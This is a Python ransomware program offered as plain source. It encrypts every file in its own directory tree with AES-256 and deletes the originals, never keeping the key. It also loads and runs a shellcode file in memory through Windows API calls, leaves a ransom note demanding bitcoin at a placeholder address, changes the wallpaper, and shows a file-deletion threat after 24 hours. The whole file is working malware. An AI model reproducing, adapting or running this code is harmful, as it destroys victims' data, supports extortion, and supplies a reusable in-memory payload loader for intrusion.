import os
import sys
import time
import ctypes
import random
import string
import struct
import shutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

AES_BLOCK_SIZE = 16
AES_KEY_SIZE = 32

# Function to generate a random AES key
def generate_key():
    return get_random_bytes(AES_KEY_SIZE)

# Function to encrypt a file using AES-256-CBC
def encrypt_file(filename, key):
    try:
        iv = get_random_bytes(AES_BLOCK_SIZE)
        cipher = AES.new(key, AES.MODE_CBC, iv)

        with open(filename, "rb") as f:
            data = f.read()

        padding_length = AES_BLOCK_SIZE - (len(data) % AES_BLOCK_SIZE)
        data += bytes([padding_length]) * padding_length  # PKCS7 Padding

        encrypted_data = cipher.encrypt(data)

        with open(filename + ".locked", "wb") as f:
            f.write(iv + encrypted_data)

        os.remove(filename)
        print(f"[+] Encrypted: {filename}")

    except Exception as e:
        print(f"[-] Error encrypting {filename}: {e}")

# Function to traverse and encrypt files in a directory
def encrypt_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith(".locked"):  # Avoid encrypting already encrypted files
                encrypt_file(file_path, key)

# Function to inject and execute a payload in memory
def inject_payload(payload):
    try:
        PAGE_EXECUTE_READWRITE = 0x40
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000

        # Allocate memory for payload
        buffer = ctypes.windll.kernel32.VirtualAlloc(
            0, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )

        if not buffer:
            raise Exception("VirtualAlloc failed")

        # Copy payload into allocated memory
        ctypes.windll.kernel32.RtlMoveMemory(buffer, payload, len(payload))

        # Execute payload
        thread = ctypes.windll.kernel32.CreateThread(0, 0, buffer, 0, 0, 0)
        if not thread:
            raise Exception("CreateThread failed")

        ctypes.windll.kernel32.WaitForSingleObject(thread, -1)
        print("[+] Payload executed in memory")

    except Exception as e:
        print(f"[-] Payload injection failed: {e}")

# Function to drop a ransom note on desktop
def drop_ransom_note():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    ransom_note_path = os.path.join(desktop_path, "READ_ME.txt")

    with open(ransom_note_path, "w") as f:
        f.write("Your files are encrypted! Send 0.01 BTC to: 1FakeBitcoinAddressXYZ\n")

    print(f"[+] Ransom note dropped at: {ransom_note_path}")

# Function to start a 24-hour timer
def start_timer():
    print("[+] Timer started, waiting 24 hours...")
    time.sleep(86400)  # 24 hours in seconds
    ctypes.windll.user32.MessageBoxW(
        0,
        "Your files will be deleted in 24 hours if payment is not made!",
        "WARNING",
        0x30 | 0x0  # MB_ICONWARNING
    )

# Function to change the wallpaper
def change_wallpaper(wallpaper_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
        print(f"[+] Wallpaper changed to: {wallpaper_path}")
    except Exception as e:
        print(f"[-] Error changing wallpaper: {e}")

def main():
    key = generate_key()
    
    # Inject payload
    payload_path = "payload.bin"
    if os.path.exists(payload_path):
        with open(payload_path, "rb") as f:
            payload = f.read()
        inject_payload(payload)
    else:
        print("[-] Payload file not found")

    # Encrypt files in the script's directory
    exe_path = os.path.dirname(os.path.abspath(__file__))
    encrypt_directory(exe_path, key)

    # Drop ransom note
    drop_ransom_note()

    # Change wallpaper (Ensure wallpaper.jpg exists in the script directory)
    wallpaper_path = os.path.join(exe_path, "wallpaper.jpg")
    if os.path.exists(wallpaper_path):
        change_wallpaper(wallpaper_path)
    else:
        print("[-] Wallpaper not found")

    # Start the 24-hour timer
    start_timer()

if __name__ == "__main__":
    main()
